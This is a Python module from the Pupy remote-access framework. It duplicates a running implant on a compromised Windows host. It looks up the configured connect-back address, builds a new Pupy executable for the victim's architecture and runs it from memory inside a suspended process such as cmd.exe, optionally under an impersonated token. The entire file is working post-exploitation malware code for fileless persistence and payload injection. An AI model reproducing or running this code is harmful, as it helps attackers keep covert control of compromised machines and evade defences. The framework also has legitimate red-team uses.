# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from pupylib.PupyErrors import PupyModuleError
from modules.lib.windows.memory_exec import exec_pe
import time
import pupygen

__class_name__="MemoryDuplicate"

@config(compatibilities=["windows"], category="manage")
class MemoryDuplicate(PupyModule):
    """ 
        Duplicate the current pupy payload by executing it from memory
    """
    interactive=1
    dependencies=["psutil", "pupwinutils.processes"]
    def __init__(self, *args, **kwargs):
        PupyModule.__init__(self,*args, **kwargs)
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="duplicate", description=self.__doc__)
        self.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
        self.arg_parser.add_argument('-m', '--impersonate', action='store_true', help='use the current impersonated token (to use with impersonate module)')

    def run(self, args):
        self.success("looking for configured connect back address ...")
        res=self.client.conn.modules['pupy'].get_connect_back_host()
        host, port=res.rsplit(':',1)
        self.success("Generating the payload with the current config ...")
        if self.client.desc["proc_arch"]=="64bit":
            raw_pe=pupygen.get_edit_pupyx64_exe(self.client.get_conf())
        else:
            raw_pe=pupygen.get_edit_pupyx86_exe(self.client.get_conf())
        self.success("Executing the payload from memory ...")
        exec_pe(self, "", raw_pe=raw_pe, interactive=False, fork=True, timeout=None, use_impersonation=args.impersonate, suspended_process=args.process)
        self.success("pupy payload executed from memory")

